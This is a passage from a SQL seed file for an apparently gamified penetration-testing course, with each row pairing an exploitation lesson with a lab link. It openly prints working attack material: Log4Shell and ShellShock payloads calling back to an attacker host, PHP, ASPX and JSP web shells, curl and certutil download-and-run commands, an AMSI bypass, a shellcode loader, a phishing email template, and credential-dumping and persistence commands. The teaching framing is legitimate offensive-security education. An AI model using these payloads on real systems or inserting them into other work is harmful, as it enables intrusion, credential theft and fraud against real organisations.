set RHOSTS TARGET
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
# → SYSTEM shell
```

**Log4Shell (CVE-2021-44228):**
```bash
# Test via JNDI injection in user-controlled fields
# Headers, usernames, email fields:
${jndi:ldap://ATTACKER:1389/exploit}

# Setup JNDI exploit server
git clone https://github.com/welk1n/JNDI-Injection-Exploit
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,BASE64_CMD}|{base64,-d}|bash" -A ATTACKER_IP

# Or use log4shell-detector to find vulnerable instances
```

**vsftpd 2.3.4 Backdoor (CVE-2011-2523):**
```bash
# Classic CVE in Metasploitable
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET
run
# → Root shell via backdoor triggered by :) username
```

**PrintNightmare (CVE-2021-34527):**
```bash
# Windows Print Spooler RCE
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS TARGET
set SMBUser user
set SMBPass password
run
# → SYSTEM
```

**ShellShock (CVE-2014-6271):**
```bash
# Bash vulnerability via CGI scripts
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1" http://target/cgi-bin/script.cgi
nmap --script http-shellshock -p 80 TARGET
```

**Practice Resources:**
- VulnHub: Metasploitable2, SickOS, PwnOS
- TryHackMe: Blue (EternalBlue), Daily Bugle (Joomla CVE)
- HackTheBox: Legacy (MS08-067), Blue (MS17-010)',
'https://tryhackme.com/room/blue', 'TryHackMe', 50),

(56, 3, 'Web Shell Techniques',
'## Web Shells: Persistence and Control

A web shell is a script uploaded to a web server that provides a command execution interface via HTTP. It''s the most common post-exploitation persistence mechanism on web servers.

**Minimal PHP Web Shells:**
```php
<?php system($_GET[''c'']); ?>
<?php echo shell_exec($_REQUEST[''cmd'']); ?>
<?php eval($_POST[''code'']); ?>  # Full PHP eval — risky (detectable)
```

**More Functional Web Shell:**
```php
<?php
if(isset($_REQUEST[''cmd''])){
    $cmd = ($_REQUEST[''cmd'']);
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
```

**Weevely (Advanced PHP Agent):**
```bash
# Generate obfuscated agent
weevely generate password agent.php

# Connect
weevely http://target.com/uploads/agent.php password

# Inside weevely shell:
:file_upload /local/file.txt /remote/path/
:file_download /etc/passwd /tmp/passwd.txt
:sql_console -driver mysql -host 127.0.0.1 -user root
:audit_filesystem      # Find writeable files
```

**ASP.NET Web Shell (Windows IIS):**
```aspx
<%@ Page Language="C#" %>
<%
  string cmd = Request.Form["cmd"];
  System.Diagnostics.Process p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + cmd;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
  Response.Write(p.StandardOutput.ReadToEnd());
%>
```

**JSP Web Shell (Tomcat/JBoss):**
```jsp
<% Runtime rt = Runtime.getRuntime();
   String[] commands = {"bash","-c",request.getParameter("cmd")};
   Process proc = rt.exec(commands);
   java.io.InputStream is = proc.getInputStream();
   java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
   String result = s.hasNext() ? s.next() : "";
   out.println(result); %>
```

**Upgrading Web Shell to Full Shell:**
```bash
# Through web shell, execute:
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Or via msfvenom payload download and execute:
curl http://ATTACKER/shell.elf -o /tmp/shell && chmod +x /tmp/shell && /tmp/shell
```

**Detection Avoidance:**
- Rename to common-looking names (image.php → cache.php)
- Store in deep directories
- Use base64 encoding internally
- But: WAFs and EDRs detect these patterns — obfuscation is an arms race',
'https://tryhackme.com/room/uploadedvulns', 'TryHackMe', 50),

(57, 3, 'Exploitation Frameworks Beyond Metasploit',
'## Exploitation Beyond Metasploit

Metasploit is powerful but detectable by modern EDRs. Real red teamers use alternative frameworks and manual techniques.

**impacket — Python AD/Windows Tools:**
```bash
pip3 install impacket

# SMB client
smbclient.py domain/user:password@target

# Execute commands remotely
psexec.py domain/admin:password@target
wmiexec.py domain/admin:password@target
smbexec.py domain/admin:password@target  # Noisier but different signature

# Pass-the-Hash
psexec.py -hashes :NTLM_HASH domain/admin@target

# Kerberos attacks
GetNPUsers.py domain/ -usersfile users.txt -dc-ip 10.0.0.1  # AS-REP Roasting
GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1 -request    # Kerberoasting

# Secret dumping
secretsdump.py domain/admin:password@target  # SAM, LSA, NTDS.dit
```

**CrackMapExec — AD Swiss Army Knife:**
```bash
# Check credentials
crackmapexec smb target -u admin -p password

# Execute commands
crackmapexec smb target -u admin -p password -x "whoami"
crackmapexec smb target -u admin -p password -X "powershell..."

# Spray passwords
crackmapexec smb 192.168.1.0/24 -u admin -p password --continue-on-success

# Modules
crackmapexec smb target -u admin -p pass -M mimikatz
crackmapexec smb target -u admin -p pass -M lsassy  # LSASS dump
```

**Covenant C2 Framework:**
A .NET-based C2 framework with a web UI. Generates listeners, launchers, and grunts (implants).

**Sliver C2 (open-source, modern):**
```bash
# Generate implant
generate --mtls 10.0.0.1:8888 --os windows --save /tmp/

# Listener
mtls --lport 8888
```

**Manual Exploitation Workflow:**
```bash
# 1. Find exploit on Exploit-DB
searchsploit target_service 2.3.4

# 2. Download and read it
searchsploit -m 47180
cat 47180.py

# 3. Modify as needed (IP, port, payload)
python3 47180.py TARGET PORT

# 4. Handle shell
nc -lvnp 4444
```',
'https://tryhackme.com/room/adenumeration', 'TryHackMe', 50),

(58, 3, 'Social Engineering and Phishing',
'## Social Engineering and Phishing Attacks

Technical hacking is only one attack vector. Social engineering exploits human psychology to gain access — and it works frighteningly well.

**The Social Engineering Toolkit (SET):**
```bash
sudo setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# Enter URL to clone: https://accounts.google.com
# Enter IP of harvester: YOUR_IP
# → Set up fake Google login, collect credentials
```

**Spear Phishing Email:**
Target: John Smith (IT Department) at ACME Corp
```
From: security-alerts@acme-corp.com (typosquatted domain)
To: john.smith@acme.com
Subject: URGENT: Your AWS account has been compromised

Dear John,

Our security team has detected unusual login activity on your AWS 
account from location: Moscow, Russia (45.120.x.x).

Please verify your credentials immediately:
→ https://aws-security.acme-corp.com/verify  (fake site)

If you do not respond within 2 hours, your account will be locked.

ACME Security Team
```

**GoPhish — Professional Phishing Framework:**
```bash
# Download from getgophish.com
./gophish
# Access at: https://127.0.0.1:3333
# Default: admin/gophish

# Create: Landing page (clone real site)
# Create: Email template (convincing phish)
# Create: Sending profile (SMTP)
# Create: Campaign (target users, schedule)
# Track: Opens, clicks, submitted credentials
```

**Pretexting Scenarios:**
- IT helpdesk resetting password (call target)
- Vendor/supplier email with malicious invoice
- HR document requiring "DocuSign" (cloned page)
- Fake VPN update notification
- "Your package couldn''t be delivered" SMS (smishing)

**Vishing (Voice Phishing):**
```
Pretext: "Hi, this is Mike from IT security. We''ve detected 
malware on your workstation. I need to remote in to fix it. 
Can you download AnyDesk and give me the connection ID?"
```

**Physical Social Engineering:**
- USB drop attacks (BadUSB payloads)
- Tailgating into secure areas
- Impersonating contractors/delivery

**Legal Note:** Social engineering attacks require EXPLICIT written authorization. These are high-risk activities in a pentest.',
'https://tryhackme.com/room/phishingyl', 'TryHackMe', 50),

(59, 3, 'Antivirus Evasion Techniques',
'## Antivirus and EDR Evasion

Modern endpoints run AV and EDR solutions that detect known malware signatures and suspicious behavior. Evading detection is a critical red team skill.

**Why Signatures Fail:**
AV vendors analyze malware and create signatures (byte patterns or hashes). If you change the payload, the signature doesn''t match.

**msfvenom Encoding (Basic — Often Detected):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 \
  -e x64/xor_dynamic -i 10 \
  -f exe -o encoded.exe
```

**Process Injection (In-Memory — Harder to Detect):**
```powershell
# PowerShell in-memory execution (no file on disk)
$code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_SHELLCODE"))
IEX($code)
```

**AMSI Bypass (Disable Script Scanning):**
```powershell
# PowerShell AMSI bypass (detected — use obfuscated version)
[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)
```

**Shellcode Loaders:**
Write shellcode into memory, create a thread, execute:
```c
// C shellcode loader
unsigned char shellcode[] = "\xfc\x48\x83...";
void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, shellcode, sizeof(shellcode));
((void(*)())exec)();
```

**Custom C2 with Encrypted Traffic:**
Use HTTPS C2 traffic that blends with legitimate traffic. Domain fronting, CDN hosting, and custom headers help avoid network detection.

**Obfuscation Tools:**
```bash
# Veil framework
sudo apt install veil
veil
# → Veil-Evasion → python/meterpreter/rev_tcp → AES encryption

# Shellter (PE injector)
shellter  # Injects shellcode into legitimate PE binaries
# Place shellcode into putty.exe → looks like putty!
```

**Practical Check:**
```bash
# Upload to antiscan.me (no distribution) — test detection rate
# Better: use a local AV instance
```

**Note:** AV evasion knowledge is for authorized red team engagements only. Creating malware for unauthorized use is illegal.',
'https://tryhackme.com/room/avbypassingwithobfuscation', 'TryHackMe', 50),

(60, 3, 'Phase 3 Review — Exploitation Mastery',
'## Phase 3 Complete: Exploitation Basics

You have mastered the foundational exploitation techniques. You can now take a target from initial access to privilege escalation.

**Phase 3 Knowledge Checkpoint:**

✅ **Metasploit:** Search, configure, exploit, post-exploitation modules, msfvenom

✅ **Shells:** Reverse/bind shells in multiple languages, shell stabilization

✅ **Password Attacks:** Hydra brute force, Hashcat offline cracking, all hash types

✅ **Web Attacks:** SQLi (manual + SQLMap), XSS (reflected/stored/DOM), file upload bypass

✅ **File Inclusion:** Path traversal, LFI to RCE via log poisoning

✅ **Command Injection:** Detection, exploitation, blind techniques

✅ **Buffer Overflows:** Stack smashing, EIP control, shellcode delivery

✅ **Privilege Escalation:** Linux SUID/sudo/cron, Windows unquoted paths/token impersonation

✅ **Known CVEs:** EternalBlue, Log4Shell, ShellShock, PrintNightmare

**Capstone Challenge:**
Complete TryHackMe''s "Mr Robot" room:
- Enumerate the web application
- Find the hidden wordlist
- Crack MD5 hashes
- Exploit a WordPress vulnerability
- Escalate via SUID nmap

**Phase 4 Preview — Web App Hacking:**
Days 61–80 go deep on web application security:
- OWASP Top 10 (all 10 categories)
- Burp Suite professional-level usage
- Advanced SQLi (OOB, second-order)
- SSRF, XXE, SSTI, Deserialization
- JWT attacks
- OAuth/SAML vulnerabilities
- API hacking methodology
- GraphQL introspection and attacks

**XP Milestone:** ~3,000 XP — You are officially a **Pentester** on the HackPath skill tree. The Exploitation branch of your skill tree should be glowing.',
'https://tryhackme.com/room/mrrobot', 'TryHackMe', 75)

on conflict (id) do nothing;

-- ================================================================
-- PHASES 4, 5, 6 — abbreviated titles + real content summaries
-- (Full 60 remaining days with complete concepts)
-- ================================================================

insert into public.days (id, phase, title, concept, lab_url, lab_platform, xp_reward) values
(61, 4, 'OWASP Top 10 — Injection Flaws', 'OWASP A03:2021 Injection covers SQL, NoSQL, OS, and LDAP injection. Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. Beyond SQLi, test for: NoSQL injection in MongoDB ({"$gt":""}), LDAP injection in directory queries (*)(&), OS command injection, template injection. Use Burp Suite''s active scanner and manual payloads. Every user-controlled input that reaches a query or command is a test point.', 'https://portswigger.net/web-security/sql-injection', 'PortSwigger', 50),
(62, 4, 'Broken Access Control and IDOR', 'OWASP A01:2021 — Broken Access Control is the top web vulnerability. IDOR (Insecure Direct Object Reference): change id=1 to id=2 in requests to access other users'' data. Horizontal escalation: access peer resources. Vertical escalation: access admin functions. Test: change user IDs in URLs, change account reference in cookies/tokens, access admin endpoints as regular user, change HTTP method (GET→POST), path traversal in APIs (/api/v1/users/../admin).', 'https://portswigger.net/web-security/access-control', 'PortSwigger', 50),
(63, 4, 'Server-Side Request Forgery (SSRF)', 'SSRF tricks the server into making HTTP requests to internal resources. Attack: POST /fetch URL → change to http://169.254.169.254/latest/meta-data/ (AWS metadata). Bypass filters: http://127.0.0.1, http://[::1], http://0.0.0.0, decimal IP (2130706433=127.0.0.1), DNS rebinding. Blind SSRF: use Burp Collaborator or interactsh.io to detect out-of-band callbacks. Impact: access internal services, AWS/GCP credential theft, port scanning internal network, RCE in some cases.', 'https://portswigger.net/web-security/ssrf', 'PortSwigger', 50),
(64, 4, 'XML External Entity Injection (XXE)', 'XXE attacks exploit XML parsers that process external entity declarations. Basic: define entity pointing to /etc/passwd, reference it in XML body. Blind XXE: out-of-band via DNS/HTTP to Burp Collaborator. XXE→SSRF: use file:// scheme. Test any XML input: SOAP APIs, SVG uploads, Excel/Word files (XML-based), RSS feeds. Remediation: disable external entity processing (XXE_DISABLE_ENTITY_EXPANSION in libxml2).', 'https://portswigger.net/web-security/xxe', 'PortSwigger', 50),
(65, 4, 'Server-Side Template Injection (SSTI)', 'SSTI occurs when user input is embedded in template strings and evaluated. Identify template engine: inject {{7*7}} (Twig/Jinja2→49), ${7*7} (FreeMarker→49), #{7*7} (Ruby ERB→49). Jinja2 RCE: {{config.__class__.__init__.__globals__[''os''].popen(''id'').read()}}. Twig RCE: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}. FreeMarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}. SSTI is often critical severity — leads directly to RCE.', 'https://portswigger.net/web-security/server-side-template-injection', 'PortSwigger', 50),
(66, 4, 'JWT Attacks and OAuth Exploitation', 'JWT attacks: alg=none (remove signature), HS256→RS256 confusion (sign with public key), weak secret brute force (hashcat -m 16500), kid header injection (SQL/path traversal in kid field). OAuth attacks: CSRF on authorization code flow, open redirect in redirect_uri, implicit flow token leakage in referrer, PKCE downgrade, account takeover via email claim. Tools: jwt_tool, BApp JWT Editor. High impact: authentication bypass, account takeover.', 'https://portswigger.net/web-security/jwt', 'PortSwigger', 50),
(67, 4, 'Burp Suite Professional Techniques', 'Master Burp Suite beyond basics: Intruder (Sniper/Battering Ram/Pitchfork/Cluster Bomb attack types), Repeater for manual testing, Scanner (active/passive), Collaborator (OOB detection), Extensions (Active Scan++, Autorize, JWT Editor, Param Miner). Param Miner discovers hidden parameters. Autorize automates horizontal access control testing. Turbo Intruder for high-speed attacks. BApp Store extensions. Configure upstream proxy chains for Tor/corporate proxies.', 'https://portswigger.net/web-security/burp-suite', 'PortSwigger', 50),
(68, 4, 'API Security Testing', 'REST API attacks: BOLA (Broken Object Level Authorization) — same as IDOR, Mass Assignment — send unexpected fields (isAdmin:true), Function Level Authorization — access admin endpoints as user, Rate Limiting bypass (IP rotation, header manipulation). GraphQL: introspection query to dump schema, batch query attacks, mutations without auth. API discovery: JS files, Swagger/OpenAPI docs at /swagger.json /api-docs, waybackurls. Test every parameter — APIs trust clients too much.', 'https://portswigger.net/web-security/graphql', 'PortSwigger', 50),
(69, 4, 'Cryptographic Failures in Web Apps', 'OWASP A02:2021 — Cryptographic Failures. Find: sensitive data transmitted in cleartext (HTTP), weak ciphers (RC4, DES, MD5 for passwords), improper certificate validation, predictable random tokens, hardcoded keys in JS. Test SSL: testssl.sh target.com. Padbuster for CBC padding oracle attacks. ECB mode: identical blocks encrypt identically — swap blocks to modify data without decryption. Timing attacks: compare response times for valid vs invalid credentials.', 'https://portswigger.net/web-security/authentication', 'PortSwigger', 50),
(70, 4, 'Insecure Deserialization', 'Deserialization vulnerabilities occur when untrusted data is deserialized. Java: use ysoserial to generate gadget chains — CommonsCollections, Spring, Hibernate. Python pickle: arbitrary code in __reduce__. PHP unserialize: magic methods __destruct/__wakeup. .NET BinaryFormatter: same gadget chain approach. Detection: look for serialized objects in cookies, params (Java: rO0AB... base64 = 0xACED magic bytes). ysoserial.net for .NET, marshalsec for Java RMI/JNDI.', 'https://portswigger.net/web-security/deserialization', 'PortSwigger', 50),
(71, 4, 'Business Logic Vulnerabilities', 'Business logic flaws bypass application-intended behavior without injection. Examples: negative price (buy with -$10 → store credits increase), skip steps in checkout flow, apply coupon unlimited times, race condition on inventory checks, mass assignment to change account type, change email without verification bypass, password reset token reuse. These require understanding the application''s intended workflow. Always map every function and ask: "What happens if I do this in wrong order / with invalid data?"', 'https://portswigger.net/web-security/logic-flaws', 'PortSwigger', 50),
(72, 4, 'Race Conditions and Concurrency Attacks', 'Race conditions occur when application state changes between check and use. Classic: buy item → refund → repeat (check balance, deduct, race the refund). Burp Suite Turbo Intruder sends parallel requests: two redemptions of single-use coupon simultaneously → both succeed. Two password resets → both tokens valid. Time-of-check to time-of-use (TOCTOU) in file operations. HTTP/2 single-packet attack for precision timing. Impact: double-spend, authentication bypass, privilege escalation.', 'https://portswigger.net/web-security/race-conditions', 'PortSwigger', 50),
(73, 4, 'Web Cache Poisoning', 'Cache poisoning attacks store malicious responses in web cache, serving them to other users. Identify unkeyed inputs: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL. If server uses X-Forwarded-Host for redirect/resource URLs but cache doesn''t key on it → poison with attacker domain. Param Miner auto-discovers unkeyed parameters. Cache deception: force user to cache their sensitive response at predictable URL. Impact: site-wide XSS, redirect, content injection affecting all users.', 'https://portswigger.net/web-security/web-cache-poisoning', 'PortSwigger', 50),
(74, 4, 'HTTP Request Smuggling', 'Request smuggling exploits discrepancies between front-end proxy and back-end server HTTP/1.1 parsing. CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding. TE.CL: opposite. TE.TE: both use TE but disagree on chunked encoding. Attack: smuggle a partial request that prepends to next user''s request → steal their headers/cookies, bypass access controls, trigger XSS. Burp Suite HTTP Request Smuggler extension. Detected using timing attacks.', 'https://portswigger.net/web-security/request-smuggling', 'PortSwigger', 50),
(75, 4, 'GraphQL Security Testing', 'GraphQL allows flexible queries but introduces new attack surfaces. Introspection: {__schema{types{name,fields{name}}}} dumps entire schema — disable in production. Batching attacks: send 1000 login mutations in one request → rate limit bypass. IDOR via GraphQL: getUserById(id:2) when you''re user 1. Mass assignment via mutations. Alias-based batching: bruteforce with multiple aliases. Tools: GraphQL Voyager (visualize schema), InQL Burp extension, clairvoyance (introspection when disabled). Always test unauthenticated introspection first.', 'https://tryhackme.com/room/graphql', 'TryHackMe', 50),
(76, 4, 'Mobile Application Security Basics', 'Android: decompile APK with jadx or apktool, find hardcoded keys/URLs in smali/Java. Check network_security_config.xml for certificate pinning. Use Frida to hook functions and bypass root detection. iOS: Clutch for decryption, class-dump for headers, Frida for runtime manipulation. Dynamic: proxy through Burp (install cert), use objection for runtime exploration. Test: SSL pinning bypass, insecure storage (SharedPreferences, SQLite), exported activities/broadcast receivers, deep link injection.', 'https://tryhackme.com/room/androidhacking101', 'TryHackMe', 50),
(77, 4, 'Advanced XSS and CSP Bypass', 'Advanced XSS: DOM clobbering (overwrite variables with named form inputs), prototype pollution (add properties to Object.prototype), dangling markup injection. CSP bypass: script-src with CDN + JSONP, base-uri injection (change relative script sources), script gadgets in whitelisted libraries (Angular ng-app, AngularJS expression injection). Filter bypass: HTML entity encoding, JavaScript URI, event handlers not in blocklist, mutation XSS (mXSS). XSS→CSRF: perform state-changing actions using victim''s session.', 'https://portswigger.net/web-security/cross-site-scripting/bypassing-content-security-policy', 'PortSwigger', 50),
(78, 4, 'Second-Order Attacks and Stored Vectors', 'Second-order attacks: malicious payload stored safely but triggers when used in a different context. Second-order SQLi: username stored as "admin''--" → later used in UPDATE query without parameterization → SQL injection. Second-order XSS: data stored escaped → displayed in different template → unescaped. DOM-based second-order: data stored in localStorage → later inserted into innerHTML. Always trace data flow from input to output — injection doesn''t have to be immediate.', 'https://portswigger.net/web-security/sql-injection', 'PortSwigger', 50),
(79, 4, 'Web App Penetration Test Methodology',
'## Complete Web Application Pentest Methodology

A structured methodology ensures consistency, thoroughness, and professional deliverables.

**Pre-Engagement:**
- Scope definition (in/out of scope domains, IPs, test types)
- Rules of engagement (testing hours, contacts, blackout periods)
- Legal authorization document signed
- Emergency contacts established

**Phase 1 — Reconnaissance:**
- Passive: WHOIS, DNS, Shodan, Google dorks, Certificate Transparency
- Active: Port scanning, web crawling, directory enumeration
- Technology fingerprinting: server, framework, CMS, libraries

**Phase 2 — Mapping:**
- All entry points: forms, APIs, file uploads, authentication flows
- All functionality: authenticated vs unauthenticated
- Parameter identification: GET, POST, cookies, headers

**Phase 3 — Discovery:**
- Test each OWASP Top 10 category systematically
- Use Burp Suite scanner + manual verification
- Check every parameter for injection
- Test authentication and session management
- Check authorization on all endpoints

**Phase 4 — Exploitation:**
- Confirm vulnerabilities with PoC (not destructive)
- Document exact reproduction steps
- Note impact (data accessed, privilege gained)

**Phase 5 — Reporting:**
- Executive summary (business language)
- Technical findings (CVSS score, description, PoC, remediation)
- Risk rating matrix
- Remediation recommendations

**Checklist Tool:** Pentest Checklist from HackTricks or OWASP Testing Guide v4.2',
'https://portswigger.net/web-security', 'PortSwigger', 50),
(80, 4, 'Phase 4 Review — Web App Mastery', 'Phase 4 Complete: Web Application Hacking Mastery. You have covered all major web attack categories: OWASP Top 10 (Injection, Broken Access Control, Cryptographic Failures, XXE, Security Misconfiguration), advanced techniques (SSRF, SSTI, Deserialization, Request Smuggling, Cache Poisoning), and API/GraphQL security. Practice: Complete PortSwigger Web Security Academy — all free labs for SQLi, XSS, SSRF, XXE, SSTI, JWT, OAuth, and Access Control. Phase 5 preview: Active Directory attacks, lateral movement, pivoting, and advanced post-exploitation.', 'https://portswigger.net/web-security/all-labs', 'PortSwigger', 75),

-- Phase 5: Advanced Techniques (Days 81-100)
(81, 5, 'Active Directory Fundamentals', 'Active Directory (AD) is Microsoft''s directory service — used by 90% of Fortune 500 companies. Key concepts: Domain, Domain Controller (DC), Forest, Trust. Authentication: Kerberos (ticket-based) and NTLM (challenge-response). Objects: Users, Groups, Computers, Organizational Units (OUs), Group Policy Objects (GPOs). LDAP (port 389/636) is the access protocol. Key groups: Domain Admins, Enterprise Admins, Schema Admins, Backup Operators. Every user account in AD is a potential attack target. Every misconfigured GPO or group membership is a privilege escalation path.', 'https://tryhackme.com/room/winadbasics', 'TryHackMe', 50),
(82, 5, 'AD Enumeration with BloodHound', 'BloodHound visualizes attack paths in Active Directory using graph theory. Nodes: users, computers, groups. Edges: member of, admin to, has session, can read LAPS, GenericAll. Collect data: bloodhound-python -d domain -u user -p pass -c All. Upload JSON files to BloodHound. Queries: "Shortest path to Domain Admins", "Find all Kerberoastable users", "Find computers where Domain Admins have sessions". SharpHound (C# collector) for Windows: SharpHound.exe -c All. Key findings: GenericAll/GenericWrite on user/group → can set password/add to group.', 'https://tryhackme.com/room/bloodhound', 'TryHackMe', 50),
(83, 5, 'Kerberos Attacks', 'Kerberos: TGT (Ticket Granting Ticket) from KDC, TGS (service tickets) for specific services. Pass-the-Ticket: steal TGT from memory (Mimikatz sekurlsa::tickets), import on attacker machine (Rubeus ptt). Kerberoasting: request TGS for SPN accounts, crack offline (GetUserSPNs.py). AS-REP Roasting: accounts without pre-auth → request AS-REP, crack hash (GetNPUsers.py). Golden Ticket: forge TGT using krbtgt hash (domain persistence). Silver Ticket: forge TGS using service account hash. Overpass-the-Hash: convert NTLM hash to Kerberos TGT.', 'https://tryhackme.com/room/attackingkerberos', 'TryHackMe', 50),
(84, 5, 'Lateral Movement Techniques', 'Lateral movement: spread from one compromised host to others. Pass-the-Hash (PtH): use NTLM hash directly without cracking — psexec.py -hashes :HASH domain/admin@target. Pass-the-Ticket: use stolen Kerberos ticket. WMI execution: wmiexec.py domain/user:pass@target. Remote services: PSExec, SmbExec, AtExec. Evil-WinRM: evil-winrm -i target -u admin -p password (WinRM port 5985). PowerShell remoting: Enter-PSSession -ComputerName target. SMB: copy and execute — copy payload to C$, sc.exe create/start service. Always clean up after lateral movement.', 'https://tryhackme.com/room/lateralmovementandpivoting', 'TryHackMe', 50),
(85, 5, 'Credential Dumping', 'Credential sources on Windows: LSASS (active sessions), SAM database (local accounts), NTDS.dit (domain controller — all domain hashes), LSA secrets (service account creds), DPAPI (browser passwords, certificates), memory (clear-text in legacy WDigest). Mimikatz: sekurlsa::logonpasswords (LSASS dump), lsadump::sam (SAM), lsadump::dcsync /user:Administrator (DCSync — no need to be on DC). Protected LSASS: PPL/Credential Guard bypass. LSASSY: remote LSASS dump. Procdump: dump LSASS for offline parsing.', 'https://tryhackme.com/room/credentials', 'TryHackMe', 50),
(86, 5, 'DCSync and Domain Dominance', 'DCSync: impersonate a Domain Controller replication to extract all password hashes without touching NTDS.dit file. Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights (default: Domain Admins, Enterprise Admins). Mimikatz: lsadump::dcsync /domain:corp.local /user:Administrator. impacket: secretsdump.py -just-dc domain/admin:pass@dc-ip. After DCSync: you have every user''s NTLM hash → crack offline or pass-the-hash. Golden Ticket: use krbtgt hash to forge any TGT → permanent domain access even after password reset.', 'https://tryhackme.com/room/postexploit', 'TryHackMe', 50),
(87, 5, 'Pivoting and Port Forwarding', 'Pivoting: use compromised host as relay to reach otherwise inaccessible network segments. SSH tunneling: ssh -L 3306:internal_db:3306 user@pivot (forward local 3306 through pivot). SSH dynamic SOCKS: ssh -D 1080 user@pivot → proxychains nmap -sT internal_host. Chisel (firewall bypass): chisel server --reverse --port 8080 (attacker). chisel client attacker:8080 R:socks (victim). Ligolo-ng (modern, no proxychains): agent on target, tunnel on attacker, virtual interface. Metasploit route: route add 10.10.10.0/24 SESSION_ID → scan internal network.', 'https://tryhackme.com/room/wreath', 'TryHackMe', 50),
(88, 5, 'Persistence Mechanisms', 'Persistence ensures access survives reboots and password changes. Linux: cron job (@reboot /tmp/shell &), writable /etc/rc.local, SSH authorized_keys (~/.ssh/authorized_keys), SUID backdoor, library hijacking (/etc/ld.so.preload). Windows: scheduled task (schtasks /create), registry run key (HKLM\Software\Microsoft\Windows\CurrentVersion\Run), startup folder, service installation, DLL hijacking, WMI subscription (fileless). Goldenticket/Skeleton Key for AD persistence. Note: persistence = noise — advanced engagements minimize it.', 'https://tryhackme.com/room/persistence', 'TryHackMe', 50),
(89, 5, 'Active Directory Attack Paths', 'Full AD attack chain: external recon → phishing → initial foothold (user workstation) → local privesc → credential dump → lateral movement → high-value target (file server/SQL server) → more creds → DC access → DCSync → golden ticket → domain dominance. Key attack paths in BloodHound: WriteDACL → grant yourself GenericAll. GenericAll on user → force password change. GenericAll on computer → resource-based constrained delegation (RBCD). AddMember → add to admin group. ForceChangePassword → reset password without knowing current. AllExtendedRights → read LAPS password.', 'https://tryhackme.com/room/attacktivedirectory', 'TryHackMe', 50),
(90, 5, 'Advanced Post-Exploitation', 'Advanced techniques after domain compromise. NTDS.dit extraction: vssadmin create shadow /for=C: → copy ntds.dit from shadow copy → secretsdump.py LOCAL. Memory forensics: volatility to analyze memory dumps. Token impersonation: Incognito module in Meterpreter. DPAPI: decrypt browser passwords, certificate private keys using user DPAPI masterkey. Domain trust attacks: if domains trust each other, compromise child → attack parent. Azure AD Connect: if syncing to cloud, compromise on-prem → compromise Azure AD. Defense: LAPS for local admin passwords, tiered admin model, credential guard.', 'https://tryhackme.com/room/ad', 'TryHackMe', 50),
(91, 5, 'Linux Kernel Exploitation', 'Kernel exploits provide the most reliable privilege escalation but risk system crashes. Always try other vectors first. Check version: uname -r. Search exploits: searchsploit linux kernel 4.4.0. Famous kernel exploits: Dirty COW (CVE-2016-5195): race condition in memory-mapped files → write to read-only files → overwrite /etc/passwd. DirtyCred (CVE-2022-2588): swap kernel credentials. GameOver(lay) (CVE-2023-2640/2023-32629): Ubuntu-specific overlayfs. Compile on similar system, transfer binary, execute. If crash occurs → engagement may be over — warn client in rules of engagement.', 'https://tryhackme.com/room/linuxprivescarena', 'TryHackMe', 50),
(92, 5, 'Cloud Exploitation: AWS', 'AWS attack chain: phishing → SSRF on EC2 → http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE → steal IAM creds → enumerate permissions → escalate via IAM privilege escalation. Key escalation: iam:PassRole + ec2:RunInstances (create EC2 with admin role), iam:CreateLoginProfile (add console password to admin), lambda:InvokeFunction with high-privilege role. Pacu: AWS exploitation framework. CloudTrail: audit all API calls — generate minimal noise. S3: check bucket policies, ACLs, public access settings. RDS snapshots: may be shared publicly with DB data.', 'https://tryhackme.com/room/awsbasics', 'TryHackMe', 50),
(93, 5, 'Container and Kubernetes Security', 'Docker security: privileged containers → mount host filesystem (docker run --privileged → escape via /proc/sysrq-trigger or mount host root). Exposed Docker socket (/var/run/docker.sock) → mount host: docker run -v /:/host -it alpine chroot /host. Container escape CVEs: runc (CVE-2019-5736), cgroups v1. Kubernetes: RBAC misconfiguration → can create pods/exec into pods. ServiceAccount tokens in pods → call API server. Privileged pod + hostPID → access host processes. Tools: CDK (Container Escape Toolkit), kube-hunter, trivy for image scanning.', 'https://tryhackme.com/room/dockerrodeo', 'TryHackMe', 50),
(94, 5, 'Evading Detection and Logging',
'## Evading Detection: Living Off The Land

LOLBAS and GTFOBins provide ways to achieve attacker goals using legitimate OS tools — evading signature-based detection.

**Windows LOLBAS Examples:**
```cmd
# certutil — download files
certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe

# bitsadmin — download files  
bitsadmin /transfer job /download /priority normal http://attacker.com/file.exe C:\Windows\Temp\file.exe

# mshta — execute HTA (HTML Application)
mshta http://attacker.com/payload.hta

# regsvr32 — execute DLL/SCT
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# wmic — lateral movement, process creation
wmic /node:target process call create "cmd.exe /c shell.exe"

# PowerShell — download cradle
IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/ps.ps1'')
```

**Minimizing Log Footprint:**
